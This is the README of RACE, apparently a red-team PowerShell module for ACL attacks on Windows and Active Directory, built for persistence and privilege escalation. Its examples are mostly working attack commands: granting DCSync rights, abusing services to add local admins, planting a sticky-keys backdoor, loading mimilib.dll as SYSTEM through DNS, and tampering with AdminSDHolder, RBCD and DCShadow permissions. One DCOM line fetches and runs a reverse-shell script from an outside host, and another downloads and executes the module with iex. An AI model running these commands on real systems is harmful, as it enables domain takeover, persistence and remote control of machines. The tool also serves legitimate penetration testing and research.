# RACE
### RACE is a PowerShell module for executing ACL attacks against Windows targets and Active Directory. RACE can be used for persistence and on demand privilege escalationon Windows machines. 
### By [nikhil_mitt](https://twitter.com/nikhil_mitt)

### Usage

Note that RACE is a tool which is used after you have admin or DA (in case of DC) privileges. 
The introductory blog post is available here: https://www.labofapenetrationtester.com/2019/08/race.html

Import the module in current PowerShell session
```powershell
PS C:\> Import-Module C:\RACE-master\RACE.psd1
```
Use dot sourcing
```powershell
PS C:\> . C:\RACE-master\RACE.ps1
```
Download and execute
```powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/RACE/master/RACE.ps1')
```

Get help about any function
```powershell
PS C:\> Get-Help Set-DCPermissions -Full
```
### Functions

Note that the functions Set-ADACL and Set-DCPermissions need Microsoft ActiveDirectory module. You can get it from a DC or from my GitHub: https://github.com/samratashok/ADModule

### Set-RemotePSRemoting
Use this function to modify ACL of PowerShell Remoting endpoint so that you can access the target machine without admin.
```powershell
PS C:\> Set-RemotePSRemoting -SamAccountName labuser -ComputerName ops-dc
```
Use the above command to add permissions on the remote machine for labuser to access PowerShell remoting.

```powershell
PS C:\> Set-RemotePSRemoting -SamAccountName labuser -ComputerName ops-dc -Credential ops\administrator
```
Use the above command to add permissions on the remote machine for labuser to access PowerShell remoting using explicit credentials.

### Set-RemoteWMI
Use this function to modify ACL of DCOM endpoint and all the namespaces so that you can access the target machine without admin.
```powershell
PS C:\> Set-RemoteWMI -SamAccountName labuser -ComputerName ops-dc
```
Use the above command to add permissions on the remote machine for labuser to access PowerShell remoting.

### Set-RemoteServicePermissions and Set-RemoteServiceAbuse
Use these tmodify ACLs of services on windows machines. 

```powershell
PS C:\> Set-RemoteServicePermissions -SamAccountName labuser -ComputerName ops-mssql -ServiceName ALG -Verbose
```
Use the above command to modify ACL of 'ALG' service on ops-mssql to allow labuser to modify the service (gives 'CCDCLCSWRPWPDTLOCRSDRCWDWO' rights)

```powershell
PS C:\> Set-RemoteServiceAbuse -ComputerName ops-mssql -UserName 'labuser' -ServiceName ALG -Verbose
```
Run the above command as 'labuser' to configure ALG to run as SYSTEM and modify its executable path to add 'labuser'
or other Principal provided in the UserName parameter to the local adminisrators group on the target machines. 

```powershell
PS C:\> sc.exe \\ops-mssql start ALG
```
Run the above command as 'labuser' to execute the payload set as executable of ALG

### Set-RemoteRegistryPermissions
Function which can be used to modify permissions of Remote Registry by modifying a registry key on local or remote machine.

```powershell
PS C:\> Set-RemoteRegistryPermissions -SamAccountName labuser -ComputerName ops-mssql -Verbose 
```
Use the above command to modify permissions of the 'Remote Registry' key on the target machine to allow 'labuser' 
access to Remote Registry. 

### Set-RegistryImageFileExecution and Invoke-RegistryAbuse
Set-RegistryImageFileExecution mdifies the Permissions for the registry key 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' and 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'.

```powershell
PS C:\> Set-RegistryImageFileExecution -SamAccountName labuser -ComputerName ops-mssql -Verbose 
```
Use the above command to modify permissions of the 'Image File Execution Options' key on the target machine to allow 'labuser' 
permissions to modify the key and its subkeys. 
```powershell
PS C:\> Invoke-RegistryAbuse -ComputerName ops-mssql -Method ImageFileExecution -Verbose 
```
Above command sets payload for sethc (sticky keys) and disables NLA.

### Set-DCOMPermissions and Invoke-DCOMAbuse
Set-DCOMPermissions can be used to modify ACLs of DCOM provide non-admin Princiapls access to DCOM.

```powershell
PS C:\> Set-DCOMPermissions -UserName labuser -ComputerName ops-mssql -Verbose 
```
Use the above command to add permissions on the target machine for labuser to execute commands using DCOM.
Then use Invoke-DCOMAbuse as labuser to run commands:
```powershell
Invoke-DCOMAbuse -ComputerName ops-build -Method MMC20 -Arguments 'iex(iwr -UseBasicParsing http://192.168.100.31:8080/Invoke-PowerShellTcp.ps1)'
```

### Set-JEAPermissions
Function which can be used to create a new JEA endpoint for PowerShell remoting to provide access for non-admin Principals. 
```powershell
PS C:\> Set-JEAPermissions -ComputerName ops-build -SamAccountName labuser -Verbose 
```
Use the above command to create a new JEA endpoint on the target machine which provides administrator privileges. 

Use the below command to connect to the target machine. Note the -ConfigurationName parameter:
```powershell
PS C:\> Enter-PSSession -ComputerName ops-build -ConfigurationName microsoft.powershell64 
```

### Set-ADACL
The function can set ACL of a domain object specified by TargetSamAccountName or DistinguishedName.

It requires Microsoft's Active Directory module. You either need the AD RSAT tools (available on DC) or get the module 
from here: https://github.com/samratashok/ADModule

```powershell
PS C:\> Set-ADACL -SamAccountName labuser -DistinguishedName 'DC=powershell,DC=local' -GUIDRight DCSync -Server powershell.local -Verbose
```
Use the above command to modify ACL of the domain object powershell.local to add DCSync rights for 'labuser'.

### Set-DNSAbusePermissions and Invoke-DNSAbuse
Use Set-DNSAbusePermissions to modify ACL of DNS Server Object and permissions for the DNS service.
```powershell
PS C:\> Set-DNSAbusePermissions -SAMAccountName labuser -DistinguishedName 'CN=MicrosoftDNS,CN=System,DC=offensiveps,DC=powershell,DC=local' -ComputerName ops-dc -Verbose
```
Use the above command to modify ACL of DNS Server to add permissions for labuser so that it can remotely load DLLs as SYSTEM on the DNS Server.

Use the below command (needs DNS Server module that is available with DNS RSAT) to load the DLL.
```powershell
PS C:\> Invoke-DNSAbuse -ComputerName ops-dc -DLLPath \\ops-build\dll\mimilib.dll -Verbose 
```

### Set-DCPermissions
Function to modify ACL of domain objects for specific attacks.
```powershell
Set-DCPermissions -Method AdminSDHolder -SAMAccountName labuser -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=offensiveps,DC=powershell,DC=local' -Verbose 
```
Use the above command to modify ACL of the AdminSDHolder to allow labuser permissions to modify ACL of AdminSDHolder.
Using these permissions, labuser can change ACL of AdminSDHolder and get rights over all the Protected Groups.

```powershell
Set-DCPermissions -Method RBCD -DistinguishedName 'CN=OPS-FILE,OU=Servers,DC=offensiveps,DC=powershell,DC=local' -SAMAccountName labuser -Verbose 
```
Use the above command to modify ACL of OPS-FILE$ user to add permissions for labuser to configure Resource-based Constrained Delegation.

### Set-DCShadowPermissions
Function to modify ACL of multiple domain objects to allow DCShadow execution without Domain Admin privilges

```powershell
PS C:\> Set-DCShadowPermissions -FakeDC emptest -SAMAccountName testuser -Username privuser -Verbose 
Use the above command to modify ACLs to run DCShadow from ps-paw machine as privuser against testuser.
```
### Bugs, Feedback and Feature Requests
Please raise an issue if you encounter a bug or have a feature request.\

### Contributing
You can contribute by fixing bugs or contributing to the code. If you cannot code, please use the tool and provide feedback and bugs!

### Supporting material

The introductory blog post is available here: https://www.labofapenetrationtester.com/2019/08/race.html
The above post contains slides and videos for the DEF CON27 talk for this tool.
